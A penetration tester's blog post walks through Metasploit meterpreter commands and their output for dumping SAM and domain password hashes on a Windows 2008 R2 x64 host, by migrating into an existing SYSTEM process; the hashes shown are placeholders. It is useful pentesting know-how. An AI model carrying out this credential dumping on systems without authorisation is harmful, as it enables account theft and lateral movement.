  <h1>Dumping Hashes on Win2k8 R2 x64 with Metasploit</h1>
  <h2></h2>
</div>
<div class="content">
  <p>When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:</p>

<p>Ah, the wonderful &lsquo;The parameter is incorrect&rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&rsquo;t the issue, but lets do a &lsquo;getprivs&rsquo; just in case:</p>

<blockquote>
<pre><code>meterpreter &gt; getprivs    
============================================================
Enabled Process Privileges
============================================================
  SeDebugPrivilege
  SeIncreaseQuotaPrivilege
  SeMachineAccountPrivilege
  SeSecurityPrivilege
  SeTakeOwnershipPrivilege
  SeLoadDriverPrivilege
  SeSystemProfilePrivilege
  SeSystemtimePrivilege
  SeProfileSingleProcessPrivilege
  SeIncreaseBasePriorityPrivilege
  SeCreatePagefilePrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeShutdownPrivilege
  SeSystemEnvironmentPrivilege
  SeChangeNotifyPrivilege
  SeRemoteShutdownPrivilege
  SeUndockPrivilege
  SeEnableDelegationPrivilege
  SeManageVolumePrivilege

meterpreter &gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
</code></pre>
</blockquote>

<p>Boo.. Ok, so maybe we have to be &lsquo;SYSTEM&rsquo;&hellip;</p>

<blockquote>
<pre><code>meterpreter &gt; getsystem
...got system (via technique 1).

meterpreter &gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
</code></pre>
</blockquote>

<p>Still nothing&hellip; Maybe it requires that we be in a 64 bit process&hellip; PID 1720 was 64 bit version of Notepad, lets try that&hellip;</p>

<blockquote>
<pre><code>meterpreter &gt; migrate 1720
[*] Migrating to 1720...
[*] Migration completed successfully.

meterpreter &gt; hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
</code></pre>
</blockquote>

<p>Damn, what about as &lsquo;SYSTEM&rsquo;&hellip;</p>

<blockquote>
<pre><code>meterpreter &gt; getsystem ...got system (via technique 1).  










meterpreter &gt; hashdump 










[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
</code></pre>
</blockquote>

<p>No joy.. hmmm What about a &lsquo;SYSTEM&rsquo; process that was already there.. &lsquo;dns.exe&rsquo; PID 1288 should be good&hellip;</p>

<blockquote>
<pre><code>meterpreter &gt; migrate 1288
[*] Migrating to 1288...
[*] Migration completed successfully.

meterpreter &gt; hashdump
Administrator:500:MYLMHASH:MYNTLMHASH:::
Guest:501:MYLMHASH:MYNTLMHASH:::
krbtgtG:502:MYLMHASH:MYNTLMHASH:::
Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
juserN:1104:MYLMHASH:MYNTLMHASH:::
jane.user??:1105:MYLMHASH:MYNTLMHASH:::
DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::

meterpreter &gt; 
</code></pre>
</blockquote>

<p>w00t. So I don&rsquo;t know why, but it seems that you have to be in a &lsquo;SYSTEM&rsquo; process who&rsquo;s primary token (started by SYSTEM) is SYSTEM (since &lsquo;getsystem&rsquo; wasn&rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.</p>

<p><strong>Update</strong> on 2011-05-15 23:39 by Rob Fuller</p>

<p>As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.</p>
